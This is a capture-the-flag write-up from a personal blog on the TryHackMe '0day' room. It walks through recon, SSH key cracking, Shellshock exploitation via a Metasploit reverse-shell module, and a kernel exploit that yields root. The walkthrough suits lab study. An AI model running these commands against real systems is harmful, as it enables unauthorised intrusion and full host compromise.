@@ -1,0 +1,177 @@
+---
+layout: default
+title : 0dat - Writeup
+---
+
+# [Main](https://bvr0n.github.io/) &nbsp;&nbsp;   [Contact](https://bvr0n.github.io/contact.html) &nbsp;&nbsp; [About Me](./aboutme.md) <br>
+
+_**Nov 10, 2020**_
+
+[0day](https://tryhackme.com/room/0day) Writeup
+
+## Recon :
+
+```
+bvr0n@kali:~/CTF/THM/0day$ nmap -sC -sV 10.10.86.209
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-10 15:38 EST
+Nmap scan report for 10.10.86.209
+Host is up (0.095s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   1024 57:20:82:3c:62:aa:8f:42:23:c0:b8:93:99:6f:49:9c (DSA)
+|   2048 4c:40:db:32:64:0d:11:0c:ef:4f:b8:5b:73:9b:c7:6b (RSA)
+|   256 f7:6f:78:d5:83:52:a6:4d:da:21:3c:55:47:b7:2d:6d (ECDSA)
+|_  256 a5:b4:f0:84:b6:a7:8d:eb:0a:9d:3e:74:37:33:65:16 (ED25519)
+80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
+|_http-server-header: Apache/2.4.7 (Ubuntu)
+|_http-title: 0day
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+## Web Recon :
+
+```
+bvr0n@kali:~/CTF/THM/0day$ ffuf -c -u http://10.10.86.209/FUZZ -w ~/Documents/Dirbuster/wordlist.txt 
+
+________________________________________________
+
+.htpasswd               [Status: 403, Size: 288, Words: 21, Lines: 11]
+.hta                    [Status: 403, Size: 283, Words: 21, Lines: 11]
+.htaccess               [Status: 403, Size: 288, Words: 21, Lines: 11]
+admin                   [Status: 301, Size: 311, Words: 20, Lines: 10]
+backup                  [Status: 301, Size: 312, Words: 20, Lines: 10]
+cgi-bin/                [Status: 403, Size: 287, Words: 21, Lines: 11]
+cgi-bin                 [Status: 301, Size: 313, Words: 20, Lines: 10]
+css                     [Status: 301, Size: 309, Words: 20, Lines: 10]
+img                     [Status: 301, Size: 309, Words: 20, Lines: 10]
+index.html              [Status: 200, Size: 3025, Words: 285, Lines: 43]
+js                      [Status: 301, Size: 308, Words: 20, Lines: 10]
+robots.txt              [Status: 200, Size: 38, Words: 7, Lines: 2]
+secret                  [Status: 301, Size: 312, Words: 20, Lines: 10]
+server-status           [Status: 403, Size: 292, Words: 21, Lines: 11]
+uploads                 [Status: 301, Size: 313, Words: 20, Lines: 10]
+```
+
+`/backup/` have a SSH private key, Let's crack it for a password.
+
+```
+bvr0n@kali:~/CTF/THM/0day$ sudo john test --wordlist=/home/bvr0n/Documents/rockyou.txt 
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+Cost 2 (iteration count) is 1 for all loaded hashes.
+Press 'q' or Ctrl-C to abort, almost any other key for status
+letmein          (id_rsa)
+```
+This was eventually a rabbit hole haha, i decided to bring `nikto` he may help me :
+
+```
+bvr0n@kali:~/CTF/THM/0day$ nikto -h 10.10.86.209
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          10.10.86.209
++ Target Hostname:    10.10.86.209
++ Target Port:        80
++ Start Time:         2020-11-10 15:54:28 (GMT-5)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.7 (Ubuntu)
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ Server may leak inodes via ETags, header found with file /, inode: bd1, size: 5ae57bb9a1192, mtime: gzip
++ Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
++ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST 
++ Uncommon header '93e4r0-cve-2014-6278' found, with contents: true
++ OSVDB-112004: /cgi-bin/test.cgi: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271)
+```
+Nikto was able to find a vulnerability named `Shellshock`.
+
+## Shellshock :
+```
+Shellshock is effectively a Remote Command Execution vulnerability in BASH.
+The vulnerability relies in the fact that BASH incorrectly executes trailing commands when it imports a function definition stored into an environment variable.
+```
+* Any *NIX OS may be vulnerable
+* Any product / appliance implementing bash may be vulnerable
+* Vulnerable since version 1.03 of Bash released in September 1989
+* RCE via Apache with mod_cgi, CGI Scripts, Python, Perl
+* RCE on DHCP clients using Hostile DHCP ServerOpenSSHRCE/Privilege escalation
+
+Shellshock Remote Command Execution via Apache CGI Script.
+
+##### Victim requirements:
+
+* Apache web server-mod_cgienabled
+* -Helloworld.cgiscript
+
+##### Attacker requirements:
+
+* Listener running to accept incoming connections
+
+## Shellsock Exploitation :
+
+I searched for it in metasploit and found 11 modules, but this one matches what we need :
+
+```
+   5   exploit/multi/http/apache_mod_cgi_bash_env_exec    2014-09-24       excellent  Yes    Apache mod_cgi Bash Environment Variable Code Injection (Shellshock)7
+```
+This is what we need to configure :
+
+```
+> set LHOST tun0
+> set RHOSTS 10.10.86.209
+> set TARGETURI /cgi-bin/test.cgi
+```
+Type exploit and wait for it :
+
+```
+msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) > exploit
+
+[*] Started reverse TCP handler on 10.8.14.157:4444 
+[*] Command Stager progress - 100.46% done (1097/1092 bytes)
+[*] Sending stage (980808 bytes) to 10.10.86.209
+[*] Meterpreter session 1 opened (10.8.14.157:4444 -> 10.10.86.209:55383) at 2020-11-10 16:09:04 -0500
+
+meterpreter >
+```
+
+## Privilege Escalation :
+
+So i did a few enumeration and i found out that this machine is running an outdated kernel :o
+
+```
+www-data@ubuntu:/home/ryan$ uname -a
+Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
+```
+
+I searched for this version and found an [Exploit](https://www.exploit-db.com/exploits/37292) for it, so let's get this root.
+
+I uploaded the exploit to the machine via my machine and compiled it :
+
+```
+www-data@ubuntu:/tmp$ gcc Kernel_exploit.c -o kec
+www-data@ubuntu:/tmp$ ./kec 
+spawning threads
+mount #1
+mount #2
+child threads done
+/etc/ld.so.preload created
+creating shared library
+# id && whoami
+uid=0(root) gid=0(root) groups=0(root),33(www-data)
+root
+```
+
+
+<br>
+best regards
+
+[bvr0n](https://github.com/bvr0n)
+
+
+<br>
+[back to main()](bvr0n.github.io/)
+
+<br>
